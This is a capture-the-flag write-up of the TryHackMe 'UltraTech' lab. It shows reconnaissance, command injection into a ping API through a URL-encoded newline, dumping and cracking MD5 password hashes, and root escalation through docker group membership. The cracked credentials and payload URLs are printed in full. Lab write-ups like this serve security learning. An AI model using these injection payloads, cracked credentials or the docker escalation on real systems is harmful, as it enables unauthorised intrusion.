# Recon

We start with a nmap scan on the target. 
```sh
sudo nmap -sV -sC -p- 10.10.125.217 -T4  
```

That shows us that several ports are open.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/UltraTech/assets/1.png">
<br>
# Port 21
I tried connecting anonymously on the FTP server but without any luck.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/UltraTech/assets/7.png">


I then conduct a directory scan with gobuster on both the services:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/UltraTech/assets/6.png">
We find some interesting folders. Let's start off with port 31331.
<br>
# Port 31331
There's an Apache webserver running on this port. After visiting the page we discover possible usernames:

```sh
John McFamicom | r00t
Francois LeMytho | P4c0
Alvaro Squalo | Sq4l
```
We read the robots.txt and find a reference to a textfile: /utech_sitemap.txt
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/UltraTech/assets/3.png">


We also find a reference to a api that runs on port 8081. There seems to be a function which can be used to ping a host.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/UltraTech/assets/4.png">
<br>
# Port 8081

> Method: Ideally we can abuse this function to do some code injection. We'll try to attempt it first with a command like ls and if proven successful we will expand this with downloading and executing a reverse shell on the host  

I tampered a bit with the url but had problems executing additional commands. I learned that i could add a newline character to add new command on a new line. We can use '%0A' for this.

I finally have a list command:
```sh
http://10.10.125.217:8081/ping?ip=localhost%0Als
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/UltraTech/assets/5.png">

We discover a sqlite database. Let's see what's inside:
```sh
http://10.10.125.217:8081/ping?ip=localhost%0Acat%20utech.db.sqlite
```

We found two hashes:
```
r00t:f357a0c52799563c7c7b76c1e7543a32
admin:0d0ea5111e3c1def594c1684e3b9be84
```

Running them through hashid tells us that they're MD5 hashes. Let's fire up hashcat in an attempt to crack them.
```sh
hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt -w 3 -O
```
```
f357a0c52799563c7c7b76c1e7543a32:n100906         
0d0ea5111e3c1def594c1684e3b9be84:mrsheafy  
```
We have succesfully cracked the hashes and will now try to connect with SSH.
<br>
# Initial foothold and privilege escalation
It looks like we don't further need to try to use command injection as we can successfully login using the r00t account. I logged in and started looking for ways to escalate our privileges. I searched for SUID's, sudo permissions and groups. Nothing stand out here except the group docker which has known vulnerabilities.

A search on GTFOBins tells us we can abuse this to escalate our privileges:

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
We now have a root shell.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/UltraTech/assets/8.png">



